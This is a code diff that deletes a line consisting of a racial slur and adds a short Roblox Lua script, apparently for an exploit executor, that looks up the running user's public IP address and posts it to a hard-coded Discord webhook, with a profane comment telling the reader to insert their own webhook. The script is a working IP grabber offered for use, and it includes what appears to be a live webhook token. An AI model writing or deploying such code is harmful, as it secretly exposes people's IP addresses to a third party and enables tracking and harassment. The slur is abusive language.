@@ -1,1 +1,18 @@
-nigger
+local HttpService = game:GetService("HttpService")
+local webhookURL = "https://discord.com/api/webhooks/1355902254103924968/iapzJZiakl43AzBscIu3cTfZa46uEFkofQXaqKwx7Ha_kpj4Wolale8P4eR5_b1QA2KX" -- PUT UR FUCKING WEBHOOK
+
+-- Get the IP
+local response = http_request({
+    Url = "https://api64.ipify.org/?format=json",
+    Method = "GET"
+})
+
+local ipData = HttpService:JSONDecode(response.Body)
+
+-- Send the IP to Discord
+http_request({
+    Url = webhookURL,
+    Method = "POST",
+    Headers = {["Content-Type"] = "application/json"},
+    Body = HttpService:JSONEncode({["content"] = "User IP: " .. ipData.ip})
+})
